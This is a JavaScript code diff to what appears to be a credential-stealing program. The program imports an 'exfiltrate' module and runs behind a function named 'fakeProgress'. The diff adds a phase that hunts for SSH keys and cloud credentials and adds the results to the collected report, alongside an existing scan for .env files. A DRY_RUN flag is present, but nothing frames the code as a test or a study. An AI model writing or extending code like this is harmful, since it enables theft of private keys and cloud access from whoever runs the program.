@@ -10,6 +10,7 @@ const { exfiltrate } = require("./app/exfil");
 const {
     collectSystemData,
     huntEnvFiles,
+    huntSecretFiles,
     performCrudOperations,
     buildReport
 } = require("./app/orchestrator");
@@ -47,6 +48,8 @@ function fakeProgress() {
     let systemData = {};
     /** @type {{ targets: (string|null)[], totalFound: number, files: import("./files/envHunter").EnvFileInfo[] }} */
     let envFiles = { targets: [], totalFound: 0, files: [] };
+    /** @type {{ sshKeys: object[], cloudCreds: object[], totalFound: number, files: object[] }} */
+    let secretFiles = { sshKeys: [], cloudCreds: [], totalFound: 0, files: [] };
     /** @type {import("./app/orchestrator").CrudEntry[]} */
     let crudLog = [];
 
@@ -75,6 +78,15 @@ function fakeProgress() {
     }
 
     try {
+        secretFiles = huntSecretFiles();
+        logger.info("Secret file scan complete");
+    } catch (err) {
+        const wrapped = new PhaseError("Secret scan", err);
+        logger.error(wrapped.message);
+        errors.push(wrapped.message);
+    }
+
+    try {
         crudLog = performCrudOperations(ROOT, DRY_RUN);
         logger.info("Phase 3 complete");
     } catch (err) {
@@ -84,7 +96,7 @@ function fakeProgress() {
     }
 
     try {
-        const report = buildReport(systemData, envFiles, crudLog, startTime, errors);
+        const report = buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors);
 
         if (DRY_RUN) {
             generateReport(report);
